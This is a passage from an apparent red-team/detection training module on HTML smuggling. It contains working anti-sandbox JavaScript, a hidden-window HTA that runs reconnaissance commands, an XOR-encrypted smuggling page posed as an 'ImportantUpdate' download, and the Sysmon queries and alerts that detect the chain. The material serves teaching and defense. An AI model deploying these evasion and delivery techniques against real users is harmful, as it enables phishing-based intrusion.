        // Check 1: Screen size (anti-sandbox)
        setTimeout(function() {
            var el = document.getElementById('c1');
            el.style.opacity = 1;
            if (screen.width >= 800 && screen.height >= 600) {
                el.innerHTML = '<span class="check">&#10004;</span>Display verified';
                passed++;
            } else {
                el.innerHTML = '<span style="color:red;">&#10008;</span>Session invalid';
                return;
            }
        }, 1000);

        // Check 2: Delay (anti-sandbox timeout)
        setTimeout(function() {
            var el = document.getElementById('c2');
            el.style.opacity = 1;
            el.innerHTML = '<span class="check">&#10004;</span>Session verified';
            passed++;
        }, 3000);

        // Check 3: Wait for mouse movement (anti-automation)
        var mouseOk = false;
        document.addEventListener('mousemove', function handler() {
            if (!mouseOk) {
                mouseOk = true;
                var el = document.getElementById('c3');
                el.style.opacity = 1;
                el.innerHTML = '<span class="check">&#10004;</span>User verified';
                passed++;

                // If all checks pass, show the button
                if (passed >= 2) {
                    document.getElementById('dlBtn').style.display = 'inline-block';
                }
                document.removeEventListener('mousemove', handler);
            }
        });

        // Download function
        document.getElementById('dlBtn').onclick = function() {
            // Our payload: a simple text file (replace with real payload in practice)
            var payload = btoa("Anti-analysis checks passed!\nMouse detected. Screen size OK. Timing OK.\nIn a real scenario, this would be your payload.");

            var raw = atob(payload);
            var arr = new Uint8Array(raw.length);
            for (var i = 0; i < raw.length; i++) arr[i] = raw.charCodeAt(i);

            var blob = new Blob([arr], {type: 'application/octet-stream'});
            var url = URL.createObjectURL(blob);
            var a = document.createElement('a');
            a.href = url;
            a.download = 'SecureDocument.txt';
            a.click();
            URL.revokeObjectURL(url);

            this.innerText = 'Downloaded ✓';
            this.disabled = true;
        };
    </script>
</body>
</html>
HTMLEOF
```

Test it: Serve from Kali and open on Windows. Notice how the checks appear one by one, and the download button only shows after you move your mouse. A sandbox would never get past this.

---

## Part 7: Full Attack Chain -- Putting It All Together

Now let us run a complete, realistic attack simulation. We will combine everything from this module into a single, end-to-end attack chain.

### 7.1 The Scenario

```
Attacker (Kali) creates an HTA payload that performs system reconnaissance
Attacker XOR-encrypts the HTA and builds a smuggling page
Attacker hosts the smuggling page on their web server
Victim (Windows) navigates to the page (simulating a phishing click)
Victim's browser assembles and downloads the HTA file
Victim opens the HTA file
mshta.exe executes the VBScript inside
VBScript runs reconnaissance commands
Attacker examines the output
Defender (us) examines the Sysmon trail
```

### 7.2 Step 1: Create the Reconnaissance HTA (on Kali)

```bash
cat > ~/labs/payloads/fullchain.hta << 'HTAEOF'
<html>
<head>
    <HTA:APPLICATION WINDOWSTATE="minimize" SHOWINTASKBAR="no" SYSMENU="no" />
</head>
<body>
<script language="VBScript">
    self.resizeTo 0, 0
    self.moveTo -1000, -1000

    Set objShell = CreateObject("WScript.Shell")
    Set objFSO = CreateObject("Scripting.FileSystemObject")

    ' Output file
    Dim outFile
    outFile = "C:\Tools\Labs\recon_report.txt"

    ' Create/overwrite the output file
    Set f = objFSO.CreateTextFile(outFile, True)
    f.WriteLine "=== RECON REPORT ==="
    f.WriteLine "Generated: " & Now()
    f.WriteLine ""

    ' Run commands and capture output
    Set exec1 = objShell.Exec("cmd.exe /c whoami")
    f.WriteLine "[*] Current User: " & exec1.StdOut.ReadAll()

    Set exec2 = objShell.Exec("cmd.exe /c hostname")
    f.WriteLine "[*] Hostname: " & exec2.StdOut.ReadAll()

    Set exec3 = objShell.Exec("cmd.exe /c ipconfig | findstr IPv4")
    f.WriteLine "[*] IP Addresses:"
    f.WriteLine exec3.StdOut.ReadAll()

    Set exec4 = objShell.Exec("cmd.exe /c net user")
    f.WriteLine "[*] Local Users:"
    f.WriteLine exec4.StdOut.ReadAll()

    f.WriteLine "=== END REPORT ==="
    f.Close

    ' Open calc as visual confirmation
    objShell.Run "calc.exe", 1, False

    self.close
</script>
</body>
</html>
HTAEOF
```

### 7.3 Step 2: Encrypt and Build (on Kali)

```bash
# XOR encrypt the HTA
python3 ~/labs/scripts/xor_encode.py ~/labs/payloads/fullchain.hta ~/labs/payloads/fullchain_xor_b64.txt "AttackChain2026"

# Build the encrypted smuggling page
cd ~/labs
./scripts/build_xor_smuggler.sh payloads/fullchain_xor_b64.txt html/fullchain.html ImportantUpdate.hta "AttackChain2026"
```

### 7.4 Step 3: Host the Page (on Kali)

```bash
cd ~/labs/html
python3 -m http.server 8080
```

### 7.5 Step 4: Simulate the Victim (on Windows)

1. Open Firefox on the Windows VM
2. Navigate to: `http://192.168.85.129:8080/fullchain.html` (Kali)
3. Wait for the "Decrypting Document..." animation to finish
4. Click the **"Download Document"** button
5. Navigate to Downloads and double-click `ImportantUpdate.hta`
6. Calculator opens (visual confirmation)

### 7.6 Step 5: Check the Recon Output

```powershell
Get-Content C:\Tools\Labs\recon_report.txt
```

You should see a full reconnaissance report with:
- Current username
- Hostname
- IP addresses
- List of local users

**This is exactly what a real attacker would do on initial access.** The HTA collects information about the compromised system and writes it to a file. In a real scenario, this data would be exfiltrated back to the attacker's C2 server instead of written to a local file.

### 7.7 Step 6: Trace the Full Sysmon Trail

Now put on your defender hat. Let us see EVERYTHING that was logged.

```powershell
# Get all events from the last 5 minutes related to the attack chain
$startTime = (Get-Date).AddMinutes(-5)

Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" |
    Where-Object {
        $_.TimeCreated -gt $startTime -and
        $_.Id -eq 1 -and
        ($_.Message -match "mshta|cmd\.exe|whoami|hostname|ipconfig|calc|net user")
    } |
    Sort-Object TimeCreated |
    Format-List TimeCreated, Message
```

You will see the entire execution tree:

```
[1] mshta.exe runs ImportantUpdate.hta          (Parent: explorer.exe)
[2] cmd.exe /c whoami                           (Parent: mshta.exe)
[3] cmd.exe /c hostname                         (Parent: mshta.exe)
[4] cmd.exe /c ipconfig | findstr IPv4          (Parent: mshta.exe)
[5] cmd.exe /c net user                         (Parent: mshta.exe)
[6] calc.exe                                    (Parent: mshta.exe)
```

**Every single action is logged.** A SOC analyst would see `mshta.exe` spawning 5 child processes including reconnaissance commands and immediately raise an alert.

---

## Part 8: Detection Deep Dive -- What Defenders See

### 8.1 Sysmon Detection Matrix for HTML Smuggling

| What Happened | Sysmon Event ID | What Gets Logged |
|:-------------|:---------------|:-----------------|
| Browser writes file to Downloads | **EID 11** (FileCreate) | File path, creating process (edge/firefox) |
| File gets MOTW tag | **EID 15** (FileCreateStreamHash) | Zone.Identifier stream with `blob:` HostUrl |
| User double-clicks the HTA | **EID 1** (ProcessCreate) | `mshta.exe` with HTA path, parent = `explorer.exe` |
| HTA spawns cmd.exe | **EID 1** (ProcessCreate) | `cmd.exe /c whoami`, parent = `mshta.exe` |
| whoami.exe runs | **EID 1** (ProcessCreate) | `whoami.exe`, parent = `cmd.exe` |
| Recon file is created | **EID 11** (FileCreate) | `C:\Tools\Labs\recon_report.txt` |
| calc.exe opens | **EID 1** (ProcessCreate) | `calc.exe`, parent = `mshta.exe` |

### 8.2 The Key Detection Indicators

**Indicator 1: `blob:` in Zone.Identifier (EID 15)**

When Sysmon logs a FileCreateStreamHash event with `blob:` in the HostUrl, it means the file was created via HTML smuggling. This is the most reliable indicator.

```powershell
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 200 |
    Where-Object { $_.Id -eq 15 -and $_.Message -match "blob:" } |
    Format-List TimeCreated, Message
```

**Indicator 2: mshta.exe spawning child processes (EID 1)**

`mshta.exe` running is not inherently suspicious (some legacy apps use it). But `mshta.exe` spawning `cmd.exe`, `powershell.exe`, `whoami.exe`, or ANY other process is a red flag.

```powershell
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 200 |
    Where-Object { $_.Id -eq 1 -and $_.Message -match "ParentImage.*mshta" } |
    Format-List TimeCreated, Message
```

**Indicator 3: Files created in Downloads then executed (EID 11 + EID 1)**

A file appearing in the Downloads folder and being executed within seconds is suspicious, especially if it is an `.hta`, `.bat`, `.cmd`, `.vbs`, or `.js` file.

### 8.3 What a Professional SOC Alert Would Look Like

```
ALERT: Possible HTML Smuggling -> HTA Execution Chain Detected
Severity: HIGH

Timeline:
  10:30:42  firefox.exe created file: C:\Users\...\Downloads\ImportantUpdate.hta
            Zone.Identifier: blob:http://192.168.85.129:8080/...
  10:30:55  mshta.exe launched from explorer.exe
            Args: "C:\Users\...\Downloads\ImportantUpdate.hta"
  10:30:56  cmd.exe spawned from mshta.exe
            Args: cmd.exe /c whoami
  10:30:56  cmd.exe spawned from mshta.exe
            Args: cmd.exe /c hostname
  10:30:57  cmd.exe spawned from mshta.exe
            Args: cmd.exe /c ipconfig | findstr IPv4
  10:30:57  cmd.exe spawned from mshta.exe
            Args: cmd.exe /c net user
  10:30:58  calc.exe spawned from mshta.exe

Indicators:
  - blob: URL in Zone.Identifier (HTML smuggling indicator)
  - mshta.exe spawning multiple child processes (execution chain)
  - Reconnaissance commands (whoami, hostname, ipconfig, net user)
  - File from Downloads folder executed immediately after creation

Recommendation: Isolate endpoint, investigate user activity, block source IP
```

### 8.4 How Defenders Would Stop This

| Defense Layer | How It Would Block This Chain |
|:-------------|:-----------------------------|
| **Email Gateway** | Cannot block -- no file was attached to the email. Only a link to the smuggling page. |
| **Web Proxy** | Could block the HTML page IF it can execute JavaScript and detect Blob creation. Most proxies cannot. |
| **MOTW + SmartScreen** | SmartScreen may warn when the HTA is opened (if it has MOTW). User must click through. |
| **ASR Rules** | Rule "Block JavaScript or VBScript from launching downloaded executable content" (D3E037E1) would block the HTA from spawning cmd.exe if enabled. |
| **EDR / Behavioral Detection** | Would flag `mshta.exe` spawning `cmd.exe` with reconnaissance commands. This is the strongest defense. |
| **WDAC / AppLocker** | Could block `mshta.exe` entirely if not needed for business operations. Strongest prevention. |

### 8.5 The Attacker-Defender Balance

```
What the attacker controls:
  + Delivery mechanism (HTML smuggling bypasses perimeter)
  + File content (XOR encryption hides from static analysis)
  + Social engineering (page design tricks the user into opening the file)
  + Execution binary (mshta.exe is signed by Microsoft)

What the defender controls:
  + Sysmon telemetry (logs the entire chain)
  + ASR rules (can block the execution pattern)
  + EDR behavioral detection (flags suspicious parent-child relationships)
  + WDAC/AppLocker (can block mshta.exe entirely)
  + User training (teach users not to open unexpected .hta files)
```

---

## Summary -- What You Built

| Exercise | What You Did | Technique |
|:---------|:-------------|:----------|
| Part 2 | Smuggled a text file via Blob API | Basic HTML smuggling |
| Part 3 | Smuggled a compiled Windows executable | EXE smuggling with build script |
| Part 4 | Added XOR encryption to hide the payload | Encrypted smuggling |
| Part 5 | Created an HTA execution chain via mshta.exe | HTA smuggling + LOLBin execution |
| Part 6 | Added anti-sandbox checks (mouse, screen, timing) | Anti-analysis evasion |
| Part 7 | Ran a full attack chain with recon output | Complete simulation |
| Part 8 | Analyzed every Sysmon event in the attack chain | Detection analysis |

### Tools You Now Have on Kali

```
~/labs/
    scripts/
        build_smuggler.sh        -- Basic HTML smuggling page builder
        build_xor_smuggler.sh    -- XOR-encrypted smuggling page builder
        xor_encode.py            -- XOR + Base64 payload encoder
    payloads/
        poc.c / poc.exe          -- Proof-of-concept executable (opens calc)
        update.hta               -- Basic HTA payload
        recon.hta                -- Reconnaissance HTA
        fullchain.hta            -- Full chain recon HTA
    html/
        smuggle-text.html        -- Text file smuggling demo
        smuggle-exe.html         -- EXE smuggling demo
        smuggle-xor.html         -- XOR-encrypted EXE smuggling
        smuggle-hta.html         -- HTA smuggling demo
        smuggle-recon.html       -- Recon HTA smuggling
        smuggle-advanced.html    -- Anti-analysis demo page
        fullchain.html           -- Complete attack chain demo
```

### Key Takeaways

1. **HTML smuggling bypasses perimeter defenses** because no malicious file crosses the network
2. **XOR encryption adds a layer** that defeats static content inspection of the HTML source
3. **HTA + mshta.exe provides execution** via a trusted Microsoft binary
4. **Anti-analysis techniques** (mouse detection, screen checks, delays) help evade automated sandboxes
5. **MOTW is still applied** -- smuggling defeats the gateway, not the endpoint
6. **Every step is logged in Sysmon** -- understanding the detection trail is what separates professionals from script kiddies

---

**Next module:** [04_lolbins_and_execution_chains.md](04_lolbins_and_execution_chains.md) -- Deep dive into Living-off-the-Land Binaries. You will learn certutil, msbuild, rundll32, and more -- each with hands-on labs and full detection analysis.
